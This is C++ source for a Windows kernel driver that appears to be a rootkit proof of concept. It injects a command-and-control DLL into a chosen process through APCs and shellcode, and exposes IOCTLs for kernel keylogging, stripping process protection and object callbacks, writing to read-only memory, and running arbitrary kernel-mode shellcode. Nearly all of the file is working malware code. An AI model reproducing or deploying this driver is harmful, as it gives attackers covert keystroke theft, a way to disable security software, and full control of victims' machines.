#include "MarkDriver.h"
#include "Memory.h"
#include "Utils.h"
#include "Macros.h"
#include "Common.h"
#include "Apc.h"
#include "Shellcode.h"
#include "RemoveProtections.h"
#include "ProcessUtils.h"


Globals g_Globals = { 0 };

constexpr CHAR* NETWORKING_DLL_PATH = "C:\\Users\\dol12\\Desktop\\Poc\\C2Client.dll";

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	PDEVICE_OBJECT deviceObject = nullptr;
	bool createdSymlink = false;
	NTSTATUS status = STATUS_SUCCESS;
	bool registeredProcessCallback = false;
	bool registeredThreadCallback = false;

	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DEVICE_NAME);
	UNICODE_STRING symlinkName = RTL_CONSTANT_STRING(SYMLINK_NAME);
	DriverObject->DriverUnload = DriverUnload;

	do {
		/*
			Initializing
		*/
		LOG_SUCCESS("Loaded driver");
		::ExInitializeRundownProtection(&g_Globals.ApcRundownProtection);

		status = ::IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
		BREAK_ON_ERROR(status, "Failed to create device object");

		status = ::IoCreateSymbolicLink(&symlinkName, &deviceName);
		BREAK_ON_ERROR(status, "Failed to create symbolic link");
		createdSymlink = true;
		
		status = ::PsSetCreateProcessNotifyRoutine(OnCreateProcess, FALSE);
		BREAK_ON_ERROR(status, "Failed to register process callback");
		registeredProcessCallback = true;

		status = ::PsSetCreateThreadNotifyRoutine(OnCreateThread);
		BREAK_ON_ERROR(status, "Failed to register thread callback");
		registeredThreadCallback = true;

		LOG_SUCCESS("Finished driver initialization");
	} while (false);

	if (!NT_SUCCESS(status)) {
		if (createdSymlink) {
			::IoDeleteSymbolicLink(&symlinkName);
		}
		if (deviceObject != nullptr) {
			::IoDeleteDevice(deviceObject);
		}
		if (registeredProcessCallback) {
			::PsSetCreateProcessNotifyRoutine(OnCreateProcess, TRUE);
		}
		if (registeredThreadCallback) {
			::PsRemoveCreateThreadNotifyRoutine(OnCreateThread);
		}

		return status;
	}

	g_Globals.HookManager = new (POOL_FLAG_PAGED) IrpHookManager();
	g_Globals.Keylogger = new (POOL_FLAG_PAGED) Keylogger(g_Globals.HookManager);
	g_Globals.ProtectionRemover = new (POOL_FLAG_PAGED) Protections::ProtectionRemover();
	g_Globals.ModuleFinder = new (POOL_FLAG_PAGED) ModuleFinder();

	deviceObject->Flags |= DO_BUFFERED_IO;

	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i) {
		DriverObject->MajorFunction[i] = DefaultDispatch;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoctlDispatch;
	return status;
}

/*
	Unloads the driver and frees its resources.
*/
void DriverUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symlinkName = RTL_CONSTANT_STRING(SYMLINK_NAME);

	delete g_Globals.Keylogger;
	delete g_Globals.ProtectionRemover;
	delete g_Globals.ModuleFinder;

	::IoDeleteSymbolicLink(&symlinkName);
	::IoDeleteDevice(DriverObject->DeviceObject);
	::PsSetCreateProcessNotifyRoutine(OnCreateProcess, TRUE);
	::PsRemoveCreateThreadNotifyRoutine(OnCreateThread);

	::ExWaitForRundownProtectionRelease(&g_Globals.ApcRundownProtection);
	LOG_SUCCESS("Finished unloading driver");
}

/*
	Handles Ioctl requests to the driver.
*/
NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	
	auto* currentStackLocation = ::IoGetCurrentIrpStackLocation(Irp);
	auto& ioctlParameters = currentStackLocation->Parameters.DeviceIoControl;

	switch (ioctlParameters.IoControlCode) {
	case IOCTL_COPY_TO_MEMORY:
		status = HandleCopyToMemory(Irp, currentStackLocation);
		break;
	case IOCTL_START_KEYLOGGING:
		status = HandleStartKeylogging(Irp);
		break;
	case IOCTL_QUERY_KEYLOGGING:
		status = HandleQueryKeylogging(Irp, currentStackLocation);
		break;
	case IOCTL_END_KEYLOGGING:
		status = HandleEndKeylogging(Irp);
		break;
	case IOCTL_REMOVE_CALLBACKS:
		status = HandleRemoveCallacks(Irp, currentStackLocation);
		break;
	case IOCTL_INJECT_LIBRARY_TO_PROCESS:
		status = HandleInjectLibraryToProcess(Irp, currentStackLocation);
		break;
	case IOCTL_REMOVE_PROTECTION:
		status = HandleRemoveProtection(Irp, currentStackLocation);
		break;
	case IOCTL_RESTORE_PROTECTION:
		status = HandleRestoreProtection(Irp, currentStackLocation);
		break;
	case IOCTL_RUN_KM_SHELLCODE:
		status = HandleRunKmShellcode(Irp, currentStackLocation);
		break;
	default:
		LOG_FAIL_VA("Received unsupported ioctl %ul", ioctlParameters.IoControlCode);
		status = STATUS_NOT_SUPPORTED;
		break;
	}

	return CompleteIrp(Irp, status, Irp->IoStatus.Information);
}

/*
	Handles a copy-to-memory request
*/
NTSTATUS HandleCopyToMemory(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_COPY_TO_MEMORY) " called");

	const auto* params = Utils::ValidateFixedSizeInput<CopyToMemoryParams>(Irp, CurrentStackLocation);
	if (params == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}
	Irp->IoStatus.Information = 0;
	return CopyToReadOnlyBuffer(params->Dest, params->Source, params->Length);
}

NTSTATUS HandleStartKeylogging(PIRP Irp) {
	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
	g_Globals.Keylogger->StartLogging();
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS HandleQueryKeylogging(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_QUERY_KEYLOGGING) " called");

	auto* outBuffer = Utils::ValidateAnysizeInput<KeyloggingOutputBuffer, UCHAR>(Irp, CurrentStackLocation, FIELD_OFFSET(KeyloggingOutputBuffer, OutputBufferLength));
	if (outBuffer == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}

	g_Globals.Keylogger->GetLoggedChars(outBuffer->Buffer, &outBuffer->OutputBufferLength);
	Irp->IoStatus.Information = outBuffer->OutputBufferLength;
	return STATUS_SUCCESS;

}

NTSTATUS HandleEndKeylogging(PIRP Irp) {
	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
	g_Globals.Keylogger->EndKeylogging();
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS HandleRemoveCallacks(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_REMOVE_CALLBACKS) " called");
	auto* params = Utils::ValidateFixedSizeInput<RemoveCallbacksParams>(Irp, CurrentStackLocation);
	if (params == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}
	params->ImageName[15] = 0; // make sure it's null terminated
	Irp->IoStatus.Information = 0;
	return Protections::RemoveProtectingObjectCallbacks(params->ImageName);
}

NTSTATUS HandleInjectLibraryToProcess(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
	Irp->IoStatus.Information = 0;
	auto* params = Utils::ValidateAnysizeInput<InjectLibraryParams, CHAR>(Irp, CurrentStackLocation, \
		FIELD_OFFSET(InjectLibraryParams, DllPath));
	if (params == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}
	params->DllPath[MAX_PATH_LENGTH - 1] = 0;
	
	PETHREAD thread = nullptr;
	auto status = PsLookupThreadByThreadId(params->Tid, &thread);
	PRINT_AND_RETURN_IF_FAILED(status, "Failed to find thread by id");
	
	return QueueApc(InjectLibraryKernelApc, KernelMode, thread, params->DllPath);
}

NTSTATUS HandleRunKmShellcode(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
	auto* params = Utils::ValidateFixedSizeInput<RunKmShellcodeParams>(Irp, CurrentStackLocation);
	if (params == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}

	PoolPointer<UCHAR> shellcodeBuf(params->KmShellcodeSize);
	PoolPointer<UCHAR> inputBuf(params->KmShellcodeSize);

	// probe user pointer
	__try {
		ProbeForRead(params->KmShellcode, params->KmShellcodeSize, 1);
		ProbeForRead(params->Input, params->InputLength, 1);

		RtlCopyMemory(shellcodeBuf.get(), params->KmShellcode, params->KmShellcodeSize);
		RtlCopyMemory(inputBuf.get(), params->Input, params->InputLength);
	}
	__except (EXCEPTION_CONTINUE_EXECUTION) {
		LOG_FAIL("Failed to read from user supplied pointers");
		return STATUS_ACCESS_VIOLATION;
	}

	// initialize parameters to km shellcode
	ULONG outputLength = CurrentStackLocation->Parameters.DeviceIoControl.OutputBufferLength;

	PoolPointer<KmShellcodeParameters> shellcodeParameters;
	shellcodeParameters->MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
	shellcodeParameters->KernelBase = g_Globals.ModuleFinder->GetModuleBaseByName("ntoskrnl.exe");
	shellcodeParameters->Input = inputBuf.get();
	shellcodeParameters->InputLength = inputBuf.length();
	shellcodeParameters->Output = Irp->AssociatedIrp.SystemBuffer;
	shellcodeParameters->OutputLength = &outputLength;

	HANDLE shellcodeThread = nullptr;
	auto status = PsCreateSystemThread(
		&shellcodeThread,
		GENERIC_ALL,
		nullptr,
		PsGetCurrentProcess(),
		nullptr,
		reinterpret_cast<PKSTART_ROUTINE>(shellcodeBuf.get()),
		shellcodeParameters.get()
	);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL_WITH_STATUS("Failed to create system thread", status);
		return status;
	}
	PVOID threadObject = nullptr;
	status = ObReferenceObjectByHandle(shellcodeThread, GENERIC_ALL, *PsThreadType, KernelMode, &threadObject, nullptr);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL_WITH_STATUS("Failed to reference shellcode thread by handle", status);
		return status;
	}

	status = KeWaitForSingleObject(threadObject, Executive, KernelMode, false, nullptr);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL_WITH_STATUS("Failed to wait for thread to finish", status);
		return status;
	}
	LOG_SUCCESS("Successfully ran KM shellcode");
	Irp->IoStatus.Information = outputLength;
	return STATUS_SUCCESS;
}

NTSTATUS HandleRemoveProtection(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_REMOVE_PROTECTION) " called");
	auto* params = Utils::ValidateFixedSizeInput<RemoveProtectionParams>(Irp, CurrentStackLocation);
	if (params == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}
	Irp->IoStatus.Information = 0;
	return g_Globals.ProtectionRemover->RemoveProcessProtection(params->Pid);
}

/*
	Restores the protection of the process.
*/
NTSTATUS HandleRestoreProtection(PIRP Irp, PIO_STACK_LOCATION CurrentStackLocation) {
	LOG_SUCCESS(STRINGIFY(IOCTL_RESTORE_PROTECTION) " called");
	auto* params = Utils::ValidateFixedSizeInput<RestoreProtectionParams>(Irp, CurrentStackLocation);
	if (params == nullptr) {
		return STATUS_BUFFER_TOO_SMALL;
	}
	Irp->IoStatus.Information = 0;
	return g_Globals.ProtectionRemover->RestoreProcessProtection(params->Pid);
}

/*
	By default, sending a not-supported IRP request will result in STATUS_NOT_SUPPORTED.
*/
NTSTATUS DefaultDispatch(PDEVICE_OBJECT, PIRP Irp) {
	return CompleteIrp(Irp, STATUS_NOT_SUPPORTED, 0);
}

/*
	Allows anyone to open/close an handle to the device.
*/
NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP Irp) {
	return CompleteIrp(Irp, STATUS_SUCCESS, 0);
}

/*
	Completes an IRP request with given status and information.
*/
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS Status, ULONG_PTR Information) {
	Irp->IoStatus.Status = Status;
	Irp->IoStatus.Information = Information;
	::IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Status;
}

/*
	Checks if the networking process was created.
*/
void OnCreateProcess(HANDLE, HANDLE ProcessId, BOOLEAN IsCreated)
{
	if (!IsCreated) return;
	if (g_Globals.Network.Pid != 0) return;

	PEPROCESS process;
	::PsLookupProcessByProcessId(ProcessId, &process);
	PUNICODE_STRING imageName = nullptr;
	::SeLocateProcessImageName(process, &imageName);
	UNICODE_STRING expectedImageNamePattern = RTL_CONSTANT_STRING(L"*" NETWORKING_PROCESS);
	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, FALSE, nullptr)) {
		LOG_SUCCESS_VA("Found matching process, pid=%04x", ::HandleToUlong(ProcessId));
		g_Globals.Network.Pid = ProcessId;
	}
	
}

/*
	Injects code using APCs into the primary thread of the networking process.
*/
void OnCreateThread(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN IsCreated)
{
	if (!IsCreated || ProcessId != g_Globals.Network.Pid || g_Globals.Network.FoundFirstThread)
		return;
	LOG_SUCCESS_VA("Running in primary thread of %ws, tid=0x%04x", NETWORKING_PROCESS, ::HandleToUlong(ThreadId));
	g_Globals.Network.FoundFirstThread = true;
	
	auto status = STATUS_SUCCESS;
	PETHREAD thread = nullptr;
	status = ::PsLookupThreadByThreadId(ThreadId, &thread);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL("Couldn't find matching ETHREAD");
		return;
	}

	status = QueueApc(InjectLibraryKernelApc, KernelMode, thread, NETWORKING_DLL_PATH);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL_WITH_STATUS("Failed to queue kernel apc", status);
		return;
	}
}

/*
	Queue usermode APC to run shellcode.
*/
void InjectLibraryKernelApc(PVOID, PVOID DllPath, PVOID) {
	LOG_SUCCESS("Kernel APC invoked");
	NTSTATUS status = STATUS_SUCCESS;

	auto* strDllPath = reinterpret_cast<PCHAR>(DllPath);
	void* shellcodeAddress = nullptr;
	size_t shellcodeSize = GetShellcodeSize();
	void* dllNameAddress = nullptr;
	auto dllNameSize = strlen(strDllPath) + 1;
	LOG_SUCCESS_VA("Calculated shellcode size to be %zu", shellcodeSize);

	do {
		// Allocate memory for the shellcode in injected process
		status = ::ZwAllocateVirtualMemory(
			NtCurrentProcess(),
			&shellcodeAddress,
			0,
			&shellcodeSize,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_EXECUTE_READ);
		BREAK_ON_ERROR(status, "Failed to allocate memory in process");
		if (shellcodeSize < GetShellcodeSize()) {
			LOG_FAIL("Couldn't allocate enough memory for the shellcode");
			break;
		}
		LOG_SUCCESS_VA("Successfully allocated shellcode memory %p", shellcodeAddress);

		// Allocate memory for the dll name in injected process
		status = ::ZwAllocateVirtualMemory(
			NtCurrentProcess(),
			&dllNameAddress,
			0,
			&dllNameSize,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE); // wtf ilan why this was PAGE_READEXECUTE
		BREAK_ON_ERROR(status, "Failed to allocate memory in new process");
		if (dllNameSize < strlen(strDllPath) + 1) {
			LOG_FAIL("Couldn't allocate enough memory for the dll name");
			break;
		}
		LOG_SUCCESS_VA("Allocated successfully DLL name memory %p", dllNameAddress);

		status = CopyToReadOnlyBuffer(shellcodeAddress, reinterpret_cast<const PVOID>(RunShellcode), shellcodeSize);
		BREAK_ON_ERROR(status, "Failed to copy shellcode");

		::RtlCopyMemory(dllNameAddress, strDllPath, dllNameSize);

		status = QueueApc(reinterpret_cast<PKNORMAL_ROUTINE>(shellcodeAddress), UserMode, KeGetCurrentThread(), dllNameAddress);
		BREAK_ON_ERROR(status, "Failed to queue usermode apc");

		LOG_SUCCESS("Successfully queued usermode APC to load lib");
	} while (false);

	if (!NT_SUCCESS(status)) {
		if (shellcodeAddress != nullptr) {
			::ZwFreeVirtualMemory(
				NtCurrentProcess(),
				&shellcodeAddress,
				&shellcodeSize,
				MEM_RELEASE
			);
		}
		if (dllNameAddress != nullptr) {
			::ZwFreeVirtualMemory(
				NtCurrentProcess(),
				&dllNameAddress,
				&dllNameSize,
				MEM_RELEASE
			);
		}
		::ExReleaseRundownProtection(&g_Globals.ApcRundownProtection);
		return;
	}
}

/// Copies into a readonly buffer using MDLs
NTSTATUS CopyToReadOnlyBuffer(PVOID Destination, const void* Source, SIZE_T Size) {
	NTSTATUS status = STATUS_SUCCESS;
	PMDL mdl = NULL;
	UCHAR lockedPages = FALSE;
	PVOID mappedAddress = NULL;
	__try {
		do {
			mdl = ::IoAllocateMdl(
				Destination,
				static_cast<ULONG>(Size),
				0,
				0,
				NULL
			);
			if (!mdl) {
				LOG_FAIL_VA("Failed to create MDL for buffer %p", Destination);
				status = STATUS_INTERNAL_ERROR;
				break;
			}

			// Ensure that the current thread has access to those pages and lock them
			::MmProbeAndLockPages(
				mdl,
				KernelMode,
				IoReadAccess);
			lockedPages = TRUE;

			// map pages to memory
			mappedAddress = ::MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority);

			if (!mappedAddress) {
				LOG_FAIL("Failed to map MDL to memory");
				status = STATUS_INTERNAL_ERROR;
				break;
			}

			LOG_SUCCESS_VA("Mapped MDL into memory %p", mappedAddress);

			status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
			BREAK_ON_ERROR(status, "Failed to set R/W perms on mdl");

			// copying data
			::RtlCopyMemory(mappedAddress, Source, Size);
			LOG_SUCCESS("Finished copying data");
		} while (false);

		// cleanup
		if (mappedAddress)
			MmUnmapLockedPages(mappedAddress, mdl);
		if (lockedPages)
			MmUnlockPages(mdl);
		if (mdl)
			IoFreeMdl(mdl);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = ::GetExceptionCode();
		LOG_FAIL_WITH_STATUS("Exception occured in " STRINGIFY(CopyToReadOnlyBuffer), status);
		return status;
	}
	
	return status;
}
